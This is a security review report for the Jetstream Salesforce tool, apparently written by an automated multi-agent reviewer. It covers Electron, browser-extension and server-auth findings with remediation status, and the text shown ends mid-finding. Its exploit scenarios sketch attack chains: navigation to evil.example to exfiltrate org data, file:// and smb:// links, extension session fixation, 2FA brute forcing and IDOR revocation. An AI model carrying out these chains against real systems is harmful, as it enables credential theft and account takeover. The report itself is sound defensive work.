# Jetstream — Application Security Review

**Date:** 2026-07-03
**Reviewer:** Application Security Engineering (automated, multi-agent code review)
**Type:** Full-source, read-only static review (no exploitation against live systems)
**Commit / branch:** `main` @ `3513a1bd4`

---

## 🛠️ Remediation update — 2026-07-03 (read this first)

A first remediation pass has landed in the working tree. Every fixed change was verified: **typecheck clean** (no new diagnostics on any touched file), **prettier + organize-imports applied**, and the relevant **unit tests pass** (`sync.types.spec.ts`, `user.controller.spec.ts` — 9/9 green). No migrations were created and no DB schema changed.

Each finding is now tagged **✅ RESOLVED**, **⏸️ HELD (needs decision)**, or noted inline. The guiding rule for this pass: fix all High items and the safe quick wins; **hold anything where a naive fix would break real users**, and document it here for a decision.

### ✅ Fixed in this pass

| # | Title | What changed | Files |
|---|-------|--------------|-------|
| H-1 | Electron navigation guard | Added `will-navigate` / `will-redirect` handlers. Cross-origin navigation of the app window is blocked; if it's a safe scheme it's opened in the default browser instead. In-app SPA routing uses the history API and is unaffected. | `apps/jetstream-desktop/src/browser/browser.ts` |
| H-2 | `shell.openExternal` scheme allow-list | New shared `openExternalSafe()` opens only `https:` / `http:` / `mailto:`; `file:`, `smb:`/UNC, and custom-protocol schemes are dropped and logged. | `apps/jetstream-desktop/src/utils/url.utils.ts` (new), `browser.ts` |
| H-4 | Extension `onMessageExternal` (session fixation) | **Removed the unauthenticated external listener entirely.** The live login flow uses the origin-validated `contentAuthScript` content-script bridge + internal `onMessage`, which is untouched. See implementation note below. | `apps/jetstream-web-extension/src/extension-scripts/service-worker.ts` |
| M-2 | External-session IDOR | `webExtensionToken.delete({ id })` → `deleteMany({ id, userId })` so a caller can only revoke **their own** external sessions (non-owned id is now a safe no-op). | `libs/auth/server/src/lib/auth.db.service.ts` |
| M-6 | Desktop download path traversal | `basename()` the renderer/browser-supplied filename before joining the download directory, across all three sinks (zip, bulk file, `will-download`). | `file-download.service.ts`, `protocol.service.ts` |
| L-5 | 2FA-bypass `deviceId` in logs | Dropped `deviceId` from the user-agent-mismatch warning (kept `userId`). | `auth.db.service.ts` |
| L-12 | Sync recursion DoS | Added a max-nesting-depth guard (100) to `stripReservedKeys`; deeper payloads are rejected with a clean error. | `libs/types/src/lib/sync/sync.types.ts` |
| L-17 | Notification `actionUrl` scheme | Both `shell.openExternal(actionUrl)` calls now route through `openExternalSafe()`. | `notification.service.ts` |
| L-20 | Auth-bridge `event.source` | Added `event.source === window` alongside the existing origin check. | `content-auth-script.ts` |
| L-21 | geo-ip constant-time auth | Basic-auth now uses a hashed constant-time compare, evaluating both fields (no short-circuit). | `apps/geo-ip-api/src/main.ts` |
| L-22 | geo-ip unbounded IP array | `ips` capped at `.max(1000)` (the only caller sends a single user's session IPs — at most dozens). | `apps/geo-ip-api/src/main.ts` |
| M-4 (partial) | Sync input caps | Added the **safe** caps: `hashedKey.max(40)` (matches the `char(40)` column) and `orgId.max(255)`. **The per-record `data` / `key` byte cap is HELD** — see below. | `sync.types.ts` |

### ⏸️ Held for a decision — a naive fix would risk breaking real users or needs product input

These are **not** done. Each is held because the obvious fix changes user-visible behavior, forces re-auth/re-login, needs a data migration, or needs testing against the packaged build. Grouped by why:

**Would break a documented user scenario / needs product call**
- **H-3 — Desktop session token stored in plaintext (`app-data.json`).** The plaintext was a *deliberate* choice to survive VDI/AVD roaming, where `safeStorage`/DPAPI keys don't persist (a code comment says so). Encrypting it naively would log out or break VDI users. **Decision needed:** encrypt-with-device-key-and-VDI-fallback, vs. accept the risk with compensating controls (shorter TTL + server-side device/IP anomaly checks). This is the highest-impact held item.
- **M-3 — SSO joins a pre-existing account by IdP-asserted email (SAML has no `email_verified`).** Tightening this changes first-time SSO onboarding/linking and could block legitimate users on IdPs that don't send `email_verified`. Needs a product decision (strict `email_verified` for the *linking* case; invitation-gated first link; no SAML auto-join by email alone).
- **L-9 — `recordSync` entitlement not enforced on the extension/desktop data-sync routes.** Adding the gate would immediately block users who currently sync via those clients without the entitlement — a billing/entitlement policy call. (Data stays user-scoped either way; this is not a data-exposure issue.)
- **L-1 — Distinct `AccountLocked` response enables user enumeration.** Returning a generic message removes the "your account is locked" signal legitimate locked-out users rely on. UX trade-off to confirm.
- **L-6 / L-19 — Absolute session cap / move extension JWT off `chrome.storage.sync`.** Both force users to re-login (and L-19 changes cross-device sync behavior). UX decisions.

**Needs testing against the packaged/built app before flipping**
- **M-7 — Desktop CSP `script-src 'unsafe-inline'`.** Removing it can break rendering if the built `index.html` emits any inline bootstrap script; needs a nonce/hash pass + a run of the packaged app.
- **L-14 / L-15 — Electron `sandbox: true` / `runAsNode: false`.** Low-risk hardening but they alter the packaged runtime; verify the app still launches and the preload works before shipping.
- **L-24 — Server CSP `style-src 'unsafe-inline'`.** Documented as required by Monaco; needs a nonce approach and visual verification.
- **L-16 — Validate IPC `event.senderFrame` origin.** High blast radius if the expected origin string is even slightly off (breaks *all* IPC = whole desktop app). H-1 already closes the primary vector; do this with device testing.
- **L-18 — Narrow extension `web_accessible_resources`.** Could break resource loading in Salesforce-page contexts; needs enumeration of what content scripts genuinely load first.

**Needs a data migration or is a larger change**
- **M-1 — Per-account 2FA lockout/throttle.** Real feature work; must be tuned to avoid locking out legitimate users who fat-finger a TOTP. Not a one-liner.
- **L-10 — Remove the legacy AES-256-CBC token decrypt path.** Requires a one-time re-encryption migration of existing tokens first.
- **L-4 — bcrypt cost + pepper.** The pepper needs a rollout/migration; a cost bump alone is safe but was grouped here for a deliberate auth change.
- **L-2 — Step-up re-auth for sensitive account changes.** New UX/feature.
- **L-11 / L-13 — Encapsulate credential encryption at the DB boundary / stop leaking internal error `message`.** L-13 risks hiding legitimately user-facing messages; both are careful refactors.
- **M-5 — Validate `openFile` / `showFileInFolder` IPC paths.** Restricting to the download dir could break legitimately opening files the user saved elsewhere; needs a review of all call sites. (H-1 reduces the exposure in the meantime.)
- **L-3 — Remove the CSRF double-submit migration bypass.** Could 403 active sessions that predate the CSRF cookie; verify the rollout window has fully elapsed first.
- **L-7 / L-8 — Canvas OAuth state binding / popup `event.origin`.** Low impact and both touch the Canvas OAuth flow; held to avoid destabilizing Canvas auth without a Canvas test pass. (L-8 was left rather than guessing the exact origin the Salesforce Canvas popup posts from.)
- **L-23 — `trust proxy` hop count behind Cloudflare.** Needs verification of the production proxy chain, not a code change in isolation.

### 📌 Implementation notes
- **New shared helper:** `apps/jetstream-desktop/src/utils/url.utils.ts` (`openExternalSafe`) is the single choke point for outbound `shell.openExternal`; `browser.ts` and `notification.service.ts` both use it. Add future external-open call sites here too.
- **H-4 approach — why remove, not allow-list:** the current manifest has no `externally_connectable`, so the current extension already can't receive those web-page messages; the landing-page external calls (`web-extension.hooks.ts`) are explicitly marked *"TEMPORARY / backwards compatibility with older extension versions."* Removing the listener is therefore behavior-preserving for the live flow and avoids newly enabling a double token-delivery path (which adding `externally_connectable` would have done). If a future flow needs external messaging, add `externally_connectable: { matches: ["https://getjetstream.app/*"] }` **and** in-handler `sender` validation.
- **H-1 is intentionally non-destructive:** a blocked cross-origin navigation is re-opened in the system browser (via `openExternalSafe`), so a legitimate external link still works for the user — it just doesn't navigate the privileged window.
- **M-4 threshold to decide:** pick a per-record serialized-size cap for `data` and a length cap for `key`. Note the query-history `key` **embeds the full SOQL**, so the `key` cap must clear the largest legitimate SOQL (Salesforce allows up to 100k chars) — that's why it wasn't guessed here.

---

## 1. Executive summary

Jetstream is a mature, security-conscious codebase. The core server-side authentication and authorization stack — session management, CSRF, password/2FA handling, credential encryption at rest, multi-tenant org-connection scoping, webhook signature verification, SSRF defenses, and platform security headers — is **implemented correctly and defensively**, frequently with load-bearing comments explaining *why* a control exists. There are **no Critical findings** and **no confirmed remote authentication bypass, SQL injection, or cross-tenant data-exposure** vulnerabilities.

The findings that matter are concentrated in the **desktop (Electron) form factor** and one **browser-extension messaging** issue:

- The **Electron app does not treat its renderer as untrusted.** The renderer posture itself is good (`contextIsolation: true`, `nodeIntegration: false`, local bundled content in production), but there is **no navigation guard**, `shell.openExternal` accepts **arbitrary-scheme URLs**, several IPC handlers take **unvalidated filesystem paths**, and the **Jetstream session token is stored in plaintext at rest**. Because the desktop SPA renders untrusted Salesforce org data, any HTML-injection or malicious-link condition escalates to main-process file/URL/credential capabilities. These are the four **HIGH** findings involving the desktop, plus one for the extension.
- The **browser extension** exposes two `onMessageExternal` handlers with **no sender validation**, allowing any co-installed extension to read the device ID and inject an attacker-owned, device-bound token (persistent session fixation).

Everything else is **Medium / Low / Informational** hardening — defense-in-depth gaps, missing rate-limit backstops, input-size caps, and crypto hygiene — none of which we could chain into a standalone critical exploit given the surrounding controls.

### Findings by severity

| Severity | Count | Where |
|---|---|---|
| **Critical** | 0 | — |
| **High** | 5 | Desktop (4), Web extension (1) |
| **Medium** | 7 | Auth core, API authz, Federated identity, DB layer, Desktop |
| **Low** | 24 | All lanes |
| **Informational** | ~15 | All lanes |

### The single most important thing we verified as *correct*

The **org-connection authorization control** — the mechanism that decides which Salesforce org a request may act on — is sound. The caller-supplied `X-SFDC-ID` selector is always resolved through `findByUniqueId_UNSAFE(user.id, uniqueId)`, backed by a DB compound-unique key on `(jetstreamUserId2, uniqueId)` **and** a redundant owner re-check. No code path lets a user point a request at another user's org connection. This is the highest-value control in a multi-tenant Salesforce tool, and it is implemented correctly.

---

## 2. Scope & methodology

**In scope (per the app owner):**
- The core application server (`apps/api`) — with emphasis on all auth flows.
- The auth library (`libs/auth/server`, `libs/auth/acl`, `libs/auth/salesforce-oauth`).
- All four deployment form factors: web app, browser extension, Salesforce Canvas app, desktop (Electron) app.
- Internal database operations and input sanitization (explicitly flagged as **critical**).
- The `geo-ip-api` supporting microservice.

**Out of scope (per the app owner):**
- Salesforce APIs themselves. User data flowing into Salesforce requests (e.g. SOQL `WHERE` clauses) should be escaped, but is explicitly **not** treated as a major issue — the user can already interact with essentially any Salesforce data, and that trust boundary lives in Salesforce. SOQL-escaping gaps are reported at most as Informational.
- The `cron-tasks` app and the `docs` app.

**Method.** Seven parallel specialist reviewers each took a lane and performed a deep, read-only trace of the relevant source — following imports end-to-end, mapping middleware order per route, and attempting to construct concrete exploit chains rather than pattern-matching. Findings carry a **Confidence** rating: *Confirmed* (traced the full path), *Likely* (strong evidence, exploit not fully constructed), or *Needs-verification* (depends on runtime/deployment facts not visible in-repo). Lanes:

1. Core authentication, sessions, password, 2FA, credential storage.
2. Federated identity — OAuth2 / OIDC / SAML / SSO / Salesforce Canvas signed-request.
3. API request authorization, multi-tenant isolation, middleware, controller framework.
4. Database layer, injection, input sanitization, credential encryption at rest.
5. Desktop (Electron) main process, preload/IPC, packaging, desktop server endpoints.
6. Browser extension (manifest, content scripts, messaging, token handling) + server endpoints.
7. Platform / transport — server bootstrap, headers, CORS, webhooks, websockets, config, `geo-ip-api`.

### Severity definitions

- **Critical** — Remote auth bypass, account takeover, RCE, SQL injection, cross-tenant data access, or secret disclosure exploitable by an unauthenticated / low-privilege attacker.
- **High** — Privilege escalation, renderer→main RCE primitives, CSRF on a sensitive action, weak crypto protecting credentials, IDOR exposing another tenant's data, or a strong exploit primitive gated only by a plausible precondition.
- **Medium** — Security-relevant weakness requiring meaningful preconditions, or a missing defense-in-depth layer with real impact.
- **Low** — Hardening / best-practice gaps with limited or well-mitigated impact.
- **Informational** — Observations, latent foot-guns, and defensive notes with no direct exploit.

---

## 3. Findings summary table

Status legend: **✅** resolved this pass · **◐** partially resolved · **⏸️** held for a decision (see top section).

| # | Sev | Status | Title | Form factor | Location | Confidence |
|---|-----|--------|-------|-------------|----------|------------|
| H-1 | High | ✅ | No Electron navigation guard (`will-navigate`/`will-redirect`) | Desktop | `apps/jetstream-desktop/src/browser/browser.ts:32-81` | Confirmed / Likely |
| H-2 | High | ✅ | `shell.openExternal` on unvalidated arbitrary-scheme URL | Desktop | `apps/jetstream-desktop/src/browser/browser.ts:57-62` | Confirmed / Likely |
| H-3 | High | ⏸️ | Session token + deviceId stored in plaintext at rest | Desktop | `apps/jetstream-desktop/src/services/persistence.service.ts:150-161,183` | Confirmed |
| H-4 | High | ✅ | `onMessageExternal` privileged actions with no sender validation (session fixation) | Extension | `apps/jetstream-web-extension/src/extension-scripts/service-worker.ts:161-201` | Confirmed |
| M-1 | Med | ⏸️ | No per-account throttle on 2FA verification (brute-forceable) | Server | `apps/api/src/app/controllers/auth.controller.ts:724-819` | Likely |
| M-2 | Med | ✅ | IDOR: `revokeExternalSession` not scoped to owner | Server | `libs/auth/server/src/lib/auth.db.service.ts:833-840` | Confirmed |
| M-3 | Med | ⏸️ | SSO joins pre-existing accounts by IdP-asserted email; SAML carries no `email_verified` | Server | `libs/auth/server/src/lib/sso-auth.service.ts:246-252,367-409` | Needs-verification |
| M-4 | Med | ◐ | No size/length caps on user records persisted to `user_sync_data` | Server | `libs/types/src/lib/sync/sync.types.ts:52,68-73` | Confirmed |
| M-5 | Med | ⏸️ | `openFile`/`showFileInFolder` IPC pass unvalidated path to `shell.openPath` | Desktop | `apps/jetstream-desktop/src/services/ipc.service.ts:43-59` | Confirmed / Likely |
| M-6 | Med | ✅ | Path traversal in download filename → arbitrary file write | Desktop | `apps/jetstream-desktop/src/services/file-download.service.ts:36,128` | Confirmed / Likely |
| M-7 | Med | ⏸️ | Desktop app window CSP allows `script-src 'unsafe-inline'` | Desktop | `apps/jetstream-desktop/src/utils/utils.ts:27` | Confirmed |
| L-1 | Low | ⏸️ | User enumeration via distinct `AccountLocked` response | Server | `libs/auth/server/src/lib/auth.db.service.ts:1122-1146` | Confirmed |
| L-2 | Low | ⏸️ | No step-up re-authentication for sensitive account changes | Server | `apps/api/src/app/controllers/user.controller.ts` (multiple) | Confirmed |
| L-3 | Low | ⏸️ | CSRF double-submit skipped when cookie absent (migration path) | Server | `apps/api/src/app/routes/route.middleware.ts:592-611` | Confirmed |
| L-4 | Low | ⏸️ | bcryptjs cost 10, no pepper, silent 72-byte truncation | Server | `libs/auth/server/src/lib/auth.utils.ts:151-169` | Confirmed |
| L-5 | Low | ✅ | Remember-device token (`deviceId`) written to logs | Server | `libs/auth/server/src/lib/auth.db.service.ts:318` | Confirmed |
| L-6 | Low | ⏸️ | No absolute session / long-lived external-token lifetime cap | Server | `apps/api/src/main.ts:111-131`; `external-auth.service.ts:28` | Confirmed |
| L-7 | Low | ⏸️ | Canvas OAuth callback has no real state/CSRF binding; PKCE verifier client-visible | Canvas | `libs/auth/salesforce-oauth/src/lib/salesforce-oauth.ts:257-282` | Confirmed |
| L-8 | Low | ⏸️ | Canvas OAuth popup `message` handler doesn't validate `event.origin` | Canvas | `apps/jetstream-canvas/src/app/core/Login.tsx:26-43` | Confirmed |
| L-9 | Low | ⏸️ | Inconsistent `recordSync` entitlement enforcement across form factors | Server | `apps/api/src/app/routes/web-extension-server.routes.ts:124-125` | Likely |
| L-10 | Low | ⏸️ | Legacy unauthenticated AES-256-CBC decrypt path for stored SF tokens | Server | `apps/api/src/app/services/salesforce-org-encryption.service.ts:140-153` | Confirmed |
| L-11 | Low | ⏸️ | DB-layer credential writes trust the caller to pre-encrypt | Server | `apps/api/src/app/db/salesforce-org.db.ts:218,264`; `team.db.ts:1244,1313` | Likely |
| L-12 | Low | ✅ | Unbounded-depth recursion over attacker JSON in `stripReservedKeys` | Server | `libs/types/src/lib/sync/sync.types.ts:22-46` | Likely |
| L-13 | Low | ⏸️ | Error handler returns internal exception `message` to clients | Server | `apps/api/src/app/utils/response.handlers.ts:391-395,312-317` | Confirmed |
| L-14 | Low | ⏸️ | Chromium renderer sandbox disabled (`sandbox: false`) | Desktop | `apps/jetstream-desktop/src/browser/config.ts:29` | Confirmed |
| L-15 | Low | ⏸️ | `runAsNode` Electron fuse left enabled | Desktop | `electron-builder.config.js:96` | Confirmed |
| L-16 | Low | ⏸️ | IPC handlers do not validate `event.senderFrame` / origin | Desktop | `apps/jetstream-desktop/src/services/ipc.service.ts:39-90` | Confirmed |
| L-17 | Low | ✅ | Server-driven `actionUrl` opened via `shell.openExternal` without scheme check | Desktop | `apps/jetstream-desktop/src/services/notification.service.ts:41-45` | Confirmed |
| L-18 | Low | ⏸️ | `web_accessible_resources` exposes every extension page to Salesforce origins (clickjacking) | Extension | `apps/jetstream-web-extension/src/manifest.json:79-90` | Likely |
| L-19 | Low | ⏸️ | Jetstream JWT persisted in `chrome.storage.sync` (cloud-replicated) | Extension | `apps/jetstream-web-extension/src/extension-scripts/service-worker.ts:189` | Confirmed |
| L-20 | Low | ✅ | `contentAuthScript.js` validates origin but not `event.source` | Extension | `apps/jetstream-web-extension/src/extension-scripts/content-auth-script.ts:15-18` | Confirmed |
| L-21 | Low | ✅ | geo-ip-api Basic Auth uses non-constant-time credential comparison | geo-ip | `apps/geo-ip-api/src/main.ts:42` | Confirmed |
| L-22 | Low | ✅ | geo-ip-api `POST /api/lookup` accepts unbounded IP array under 20 MB body | geo-ip | `apps/geo-ip-api/src/main.ts:18,102-118` | Confirmed |
| L-23 | Low | ⏸️ | `trust proxy = 1` may mis-attribute client IP behind Cloudflare | Platform | `apps/api/src/main.ts:138` | Needs-verification |
| L-24 | Low | ⏸️ | CSP `style-src` allows `'unsafe-inline'` and blanket `https:` | Platform | `apps/api/src/app/utils/security-headers.ts:126-130` | Confirmed |

Informational items are consolidated in §7.

---

## 4. High-severity findings

> All four HIGH desktop/extension items share a root cause worth stating up front: **the client renders untrusted data (Salesforce org records, server-driven notifications) but the surrounding runtime grants that renderer powerful capabilities without a trust boundary.** Fixing navigation control, scheme allow-listing, IPC path validation, and at-rest encryption collectively closes the escalation path.

### H-1 — No Electron navigation guard (`will-navigate` / `will-redirect`) — ✅ RESOLVED (2026-07-03)
- **Form factor:** Desktop
- **Status:** Fixed — `will-navigate`/`will-redirect` handlers added in `browser.ts`; cross-origin navigation is blocked and, if a safe scheme, opened in the default browser.
- **Location:** `apps/jetstream-desktop/src/browser/browser.ts:32-81` (no `webContents.on('will-navigate' | 'will-redirect')` anywhere)
- **Category:** Electron navigation hardening / renderer→main capability escalation (CWE-1188)
- **Description:** The main window attaches a preload that exposes `window.electronAPI` and loads `app://jetstream/...`. Electron's security guidance requires a `will-navigate` handler to keep the top-level frame on trusted content. There is none. `setWindowOpenHandler` only governs `window.open` / `target=_blank`; a top-level navigation via `location.href`, a form submit, `<meta http-equiv=refresh>`, or an ordinary same-window `<a href>` to `https://evil.example` is **not** intercepted. Because the preload runs on every document the webContents loads, the attacker origin then receives `window.electronAPI` and can invoke every exposed handler: `request()` (read/write all connected Salesforce orgs), `openFile()`/`showFileInFolder()`, `downloadZipToFile()`/`downloadBulkApiFile()` + `setPreferences()`, `installUpdate()`, etc. The forced CSP does not help — `script-src` includes `'unsafe-inline'` and `'self'` resolves to the *navigated* origin (see M-7).
- **Exploit scenario:** An admin opens a record/metadata whose rendered value injects script or an auto-navigating link (the SPA displays untrusted org data). The renderer executes `location.href='https://evil.example/x'`; the window navigates unguarded; evil.example's inline script calls `window.electronAPI.request(...)` to exfiltrate data from every connected org and `openFile('/path/to/dropped.app')` to launch a payload.
- **Confidence:** Confirmed (missing control) / Likely (full chain needs a renderer-side injection or malicious-link trigger)
- **Remediation:** Add `webContents.on('will-navigate', …)` and `will-redirect` handlers that `preventDefault()` any navigation whose origin is not `app://jetstream` (or `http://localhost:4201` in dev). Also handle `will-frame-navigate` / `will-attach-webview`.

### H-2 — `shell.openExternal` on an unvalidated, arbitrary-scheme URL from the renderer — ✅ RESOLVED (2026-07-03)
- **Form factor:** Desktop
- **Status:** Fixed — new `openExternalSafe()` (`url.utils.ts`) allows only `https:`/`http:`/`mailto:`; used by `browser.ts` and `notification.service.ts`. Also resolves L-17.
- **Location:** `apps/jetstream-desktop/src/browser/browser.ts:57-62` (contains the in-code `// FIXME: this should be more protective over what is externally opened`)
- **Category:** `shell.openExternal` abuse / dangerous URL scheme (CWE-749, CWE-601)
- **Description:** In `setWindowOpenHandler`, any `window.open`/`target=_blank` whose host differs from the client host is passed verbatim to `shell.openExternal(details.url)` with **no scheme allow-list**. The OS will act on dangerous schemes: `file://` (launch a local executable/`.app` on macOS/Windows), `smb://`/UNC (NTLM credential theft / remote payload on Windows), or any registered custom-protocol handler. This fires on ordinary link opens, so it is reachable not only via XSS but potentially by a user clicking an attacker-controlled link value planted in Salesforce org data.
- **Exploit scenario:** A shared/malicious Salesforce record contains a link field `file:///Applications/Calculator.app` (or `smb://attacker/share/x`). Opened in a new window/tab, `setWindowOpenHandler` sees a non-client host and calls `shell.openExternal` on it → the OS launches the target; combined with a dropped file this becomes local code execution.
- **Confidence:** Confirmed (no validation) / Likely (impact depends on scheme + platform)
- **Remediation:** Before `shell.openExternal`, parse the URL and allow only `https:` (plus `mailto:`/`http:` if genuinely required); reject everything else. Apply the same allow-list to the frontdoor branch (`browser.ts:51`) and to server-driven URLs (see L-17).

### H-3 — Jetstream session token and deviceId stored in plaintext at rest — ⏸️ HELD (needs decision)
- **Form factor:** Desktop
- **Status:** Held — plaintext is a deliberate VDI/AVD-roaming workaround (safeStorage/DPAPI keys don't persist there). Encrypting naively would break VDI users. Decision needed: device-key-with-fallback vs. accepted risk + compensating controls. See top section.
- **Location:** `apps/jetstream-desktop/src/services/persistence.service.ts:150-161` (`writeFile` default `encrypt=false`), `:183/:208/:225`; schema `libs/desktop-types/src/lib/desktop-app.types.ts:153-163`
- **Category:** Cleartext storage of credentials (CWE-312)
- **Description:** `app-data.json` is written as plaintext JSON (a code comment explains this was to survive VDI/AVD roaming where `safeStorage`/DPAPI keys don't persist). That file contains the Jetstream bearer JWT (`accessToken`) and its `deviceId`. The server binds the token to the deviceId, but **both factors live in the same cleartext file**, so device binding adds no at-rest protection. Critically, the org-tokens file (`orgs.json`) *is* encrypted — but its AES-256-GCM key is fetched from the server via `/desktop-app/auth/verify` **using this very access token**. The plaintext token is therefore the linchpin: whoever reads `app-data.json` can (a) impersonate the user to the Jetstream backend, and (b) call `/auth/verify` to obtain the org-encryption key and, with `orgs.json`, decrypt every Salesforce access + refresh token.
- **Exploit scenario:** Malware running as the user, a backup/DLP/profile-sync agent, or any principal with read access to the userData directory copies `app-data.json` (+ `orgs.json`), fetches the encryption key from the server, and decrypts all connected Salesforce org credentials.
- **Confidence:** Confirmed
- **Remediation:** Encrypt `app-data.json` with the OS keychain / `safeStorage` where available, falling back to a device-bound key. If plaintext must remain for VDI portability, record it as an accepted risk with compensating controls: the existing 7-day TTL + rotation is good but insufficient alone — add server-side device/IP anomaly checks and consider a shorter TTL.

### H-4 — Extension `onMessageExternal` performs privileged actions with no sender validation (session fixation) — ✅ RESOLVED (2026-07-03)
- **Form factor:** Web extension
- **Status:** Fixed — the `onMessageExternal` listener was removed. The live login flow (origin-validated content-script bridge + internal `onMessage`) is unaffected; the manifest already had no `externally_connectable`, so no legitimate flow depended on it.
- **Location:** `apps/jetstream-web-extension/src/extension-scripts/service-worker.ts:161-201`; `apps/jetstream-web-extension/src/manifest.json` (no `externally_connectable` key)
- **Category:** Missing sender validation on privileged message handler (CWE-346, CWE-384)
- **Description:** The service worker registers `browser.runtime.onMessageExternal.addListener` handling two message types with no inspection of `sender` (the handler does not even accept the `sender` argument): `EXT_IDENTIFIER` returns the extension's persistent `deviceId`, and `TOKENS` decodes a caller-supplied JWT and writes it to `chrome.storage.sync` as the active session. Because the manifest declares **no `externally_connectable`**, web pages cannot reach these handlers — but Chrome's default for `onMessageExternal` is "all other installed extensions." The extension ID is fixed (pinned via `key`) and public, so any co-installed extension can address it.
- **Exploit scenario:** A malicious co-installed extension: (1) sends `EXT_IDENTIFIER` → receives the victim's `deviceId`; (2) authenticates to `getjetstream.app` as the *attacker's own* account and calls `POST /web-extension/auth/session` with `X-EXT-DEVICE-ID: <victimDeviceId>`, minting an attacker-owned token bound to the victim's deviceId; (3) sends `TOKENS` with that token → the victim's extension stores it and marks `loggedIn`. Because the injected token's bound deviceId equals the victim's stored `extIdentifier`, the victim's next `VERIFY_AUTH` **succeeds** server-side, so the fixation persists. The victim's extension now operates as the attacker's Jetstream user; with Data Sync enabled, the victim's query history / SOQL / activity is pushed under the attacker's account and becomes attacker-readable. (The attacker cannot read the victim's *existing* token — cross-extension storage is isolated — so this is session fixation / login-CSRF, not token theft, hence High not Critical.)
- **Confidence:** Confirmed
- **Remediation:** These external handlers are **not needed** for the real login flow, which runs through the origin-validated `contentAuthScript.js` postMessage bridge + internal `onMessage`. Preferred fix: **remove the `onMessageExternal` handlers.** If external messaging must remain, add an explicit `externally_connectable` allow-list (`{"matches":["https://getjetstream.app/*"]}`) **and** validate `sender.url`/`sender.origin` inside the handler; never accept a full token via message, and don't return the raw `deviceId` to unauthenticated callers.

---

## 5. Medium-severity findings

### M-1 — No per-account throttle on 2FA verification (second factor is brute-forceable given the password) — ⏸️ HELD (needs decision)
- **Status:** Held — a per-user 2FA lockout is real feature work and must be tuned so legitimate users who mistype a TOTP aren't locked out. Not a one-liner.
- **Location:** `apps/api/src/app/controllers/auth.controller.ts:724-819`; `auth.routes.ts:47-56` (`VerifyAttemptRateLimit`, keyed by `sessionID`); `route.utils.ts:39-48` (per-IP key gen); `auth.db.service.ts:1173` (`recordFailedLoginAttempt` only on the password path)
- **Category:** 2FA / Rate limiting / Brute force
- **Description:** The only limits on `/api/auth/verify` are (a) `req.session.pendingVerificationAttempts` (session destroyed after `MAX_VERIFICATION_ATTEMPTS = 5`) and (b) `VerifyAttemptRateLimit` (5 per **session** per 15 min) — both per-session. A fresh session is trivially minted by re-submitting the (correct) password to `/callback/credentials`, which resets the failed-login counter and creates a new `pendingVerification` with a fresh budget. The login rate limit is keyed purely by client IP, so it's defeated by IP rotation. There is **no per-user counter or lockout on 2FA verification** — account lockout fires only for wrong passwords, never wrong OTP/codes. TOTP failures are silent (no email), making `2fa-otp` the softest target.
- **Exploit scenario:** An attacker holding the victim's password (phished/reused/breached) loops: POST correct password → new session with `pendingVerification=[2fa-otp]` → POST 5 guessed codes → repeat from a rotating IP pool. Nothing server-side caps the aggregate attempts against the account, so 2FA collapses toward the strength of a 6-digit code. Success = full account takeover. (High volume and noisy in `LoginActivity`, which tempers real-world severity → Medium.)
- **Confidence:** Likely
- **Remediation:** Add a per-**user** 2FA-failure counter with lockout/backoff (mirror the existing password-lockout logic) applied inside `verification` for both OTP and email codes; cap concurrent live `pendingVerification` sessions per user; and/or add an account-keyed limiter alongside the IP one.

### M-2 — IDOR: `revokeExternalSession` deletes any user's extension/desktop token (missing owner scoping) — ✅ RESOLVED (2026-07-03)
- **Status:** Fixed — changed to `deleteMany({ where: { id: sessionId, userId } })` so a caller can only revoke their own external sessions.
- **Location:** `libs/auth/server/src/lib/auth.db.service.ts:833-840`; reached via `apps/api/src/app/controllers/user.controller.ts:293-295`; route `DELETE /api/me/profile/sessions/:id?type=EXTERNAL_SESSION` (`api.routes.ts:69`)
- **Category:** Broken Object-Level Authorization (IDOR / OWASP A01) — *independently reported by two reviewers*
- **Description:** `revokeUserSession` (same file, :818) correctly scopes its delete to the caller. Its sibling `revokeExternalSession(userId, sessionId)` validates that `userId` is non-empty but then ignores it: `prisma.webExtensionToken.delete({ where: { id: sessionId } })`. The authenticated caller's `userId` is never applied, so any authenticated user can delete **any** `WebExtensionToken` row — forcibly revoking another user's extension/desktop session. The controller only checks `params.id` shape (`min(32).max(64)`), which a 36-char UUID satisfies.
- **Exploit scenario:** Authenticated attacker sends `DELETE /api/me/profile/sessions/<victim-token-uuid>?type=EXTERNAL_SESSION` with a valid CSRF token → victim is logged out of their extension/desktop app (repeatable DoS); the delete also acts as a token-existence oracle (P2025 vs success). Bounded to Medium because `WebExtensionToken.id` is a random v4 UUID not returned to other users, so the attacker needs an out-of-band leak of the id — but the authorization gap itself is unambiguous.
- **Confidence:** Confirmed
- **Remediation:** Scope the delete to the owner: `prisma.webExtensionToken.deleteMany({ where: { id: sessionId, userId } })` (use `deleteMany` so a non-owned id is a no-op instead of a throwing `delete`), mirroring `revokeUserSession`.

### M-3 — SSO joins pre-existing accounts by IdP-asserted email; SAML path carries no email-verification signal — ⏸️ HELD (needs decision)
- **Status:** Held — changes first-time SSO onboarding/linking; could block legitimate users on IdPs that omit `email_verified`. Needs a product decision (see top section).
- **Location:** `libs/auth/server/src/lib/sso-auth.service.ts:246-252` (email fallback), `:311-316` (domain gate), `:367-409` (JIT); `libs/auth/server/src/lib/saml.service.ts:306-333` (no `email_verified`); contrast `oidc.service.ts:215-218` (OIDC soft check)
- **Category:** Broken authentication / account linking by unverified email (CWE-287, OWASP A07)
- **Description:** When an incoming SSO identity has no matching `AuthIdentity` yet (first login for that IdP subject), `resolveSsoUser` falls back to `user.findMany({ where: { email } })` and, if exactly one user matches, logs the caller into that pre-existing account and links the new subject to it. The only gates are (a) the email's domain must be in the team's configured (verified) domains, and (b) for OIDC only, a *soft* `email_verified !== false` check that passes when the claim is absent. The **SAML path has no email-verification notion at all** — it takes the mapped attribute or `NameID` verbatim. IdP-provided *role* is correctly not trusted (JIT defaults to `MEMBER`), which blocks self-escalation, but logging into an existing higher-privileged same-domain account (e.g. team `ADMIN`) is not prevented by that.
- **Exploit scenario:** On a tenant whose IdP lets a principal set/assert a colleague's same-domain `email`/`NameID`, attacker Eve asserts `email=admin@corp.com`; her subject isn't linked, resolution falls through to the email lookup, and `handleSsoLogin` initializes a session as the admin and links `eve-sub → admin`. Result: same-domain account takeover.
- **Confidence:** Needs-verification (code path Confirmed; real-world exploitability depends on the tenant IdP allowing a principal to assert a colleague's email — mature IdPs like Okta/Azure AD/Google normally prevent this)
